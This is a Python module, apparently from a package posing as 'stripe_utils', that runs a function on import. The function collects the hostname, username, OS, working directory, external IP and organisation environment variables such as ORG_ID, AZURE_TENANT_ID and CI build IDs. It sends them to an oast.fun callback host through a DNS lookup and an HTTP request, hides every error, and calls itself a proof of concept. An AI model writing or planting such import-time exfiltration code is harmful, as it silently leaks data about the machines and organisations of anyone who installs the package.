import os
import socket
import platform
import base64
import urllib.request
import datetime
import sys
import inspect 
import urllib.parse 
def send_poc_callback():
 
    OAST_URL = "wvmjioytxqdcokzvflqjv6v35ug1nfyjl.oast.fun"
    
    try:
      
        hostname = socket.gethostname()
        username = os.getenv("USER") or os.getenv("USERNAME") or "unknown"
        os_type = platform.system()
        os_release = platform.release()
        python_version = sys.version.split("\n")[0]

       
        execution_time = datetime.datetime.utcnow().isoformat() + "Z" # ISO 8601 format with Z for UTC


        current_working_directory = os.getcwd()
        try:

            file_path = os.path.abspath(inspect.getfile(inspect.currentframe()))
        except Exception:
            file_path = "unknown"


        package_name = "unknown_package"
        try:

            if '__package__' in globals() and globals()['__package__'] is not None:
                package_name = globals()['__package__']
            elif 'stripe_utils' in sys.modules: 
                package_name = 'stripe_utils'
        except Exception:
            pass

     
        external_ip = "unknown_ip"
        try:
            
            external_ip = urllib.request.urlopen('https://icanhazip.com', timeout=2 ).read().decode().strip()
        except Exception:
            pass


        env_indicators = {
            "COMPANY_NAME": os.getenv("COMPANY_NAME"),
            "ORG_ID": os.getenv("ORG_ID"),
            "AWS_REGION": os.getenv("AWS_REGION"),
            "AZURE_TENANT_ID": os.getenv("AZURE_TENANT_ID"),
            "CI": os.getenv("CI"), 
            "BUILD_ID": os.getenv("BUILD_ID"),
        }

        env_indicators_filtered = {k: v for k, v in env_indicators.items() if v}

        dns_info_parts = [
            hostname.replace(".", "-").replace(" ", "-").replace("_", "-"),
            username.replace(".", "-").replace(" ", "-").replace("_", "-"),
            os_type.replace(".", "-").replace(" ", "-").replace("_", "-"),
            package_name.replace(".", "-").replace(" ", "-").replace("_", "-"),
        ]
        dns_subdomain = ".".join(filter(None, dns_info_parts))
        full_dns_domain = f"{dns_subdomain}.{OAST_URL}"


        try:
            socket.gethostbyname(full_dns_domain)
        except Exception:
            pass


        http_params = {
            "pkg": package_name,
            "time": execution_time,
            "cwd": base64.b64encode(current_working_directory.encode( )).decode(),
            "file_path": base64.b64encode(file_path.encode()).decode(),
            "host": hostname,
            "user": username,
            "os": f"{os_type}-{os_release}",
            "py_ver": python_version,
            "ext_ip": external_ip,
        }
        
        for k, v in env_indicators_filtered.items():
            http_params[f"env_{k.lower( )}"] = base64.b64encode(v.encode()).decode()

       
        query_string = urllib.parse.urlencode(http_params )
        full_http_url = f"http://{OAST_URL}/?{query_string}"

        
        try:
            urllib.request.urlopen(full_http_url, timeout=5 )
        except Exception:
            pass
            
    except Exception:
       
        pass

# استدعاء الوظيفة فور استيراد الحزمة
send_poc_callback()
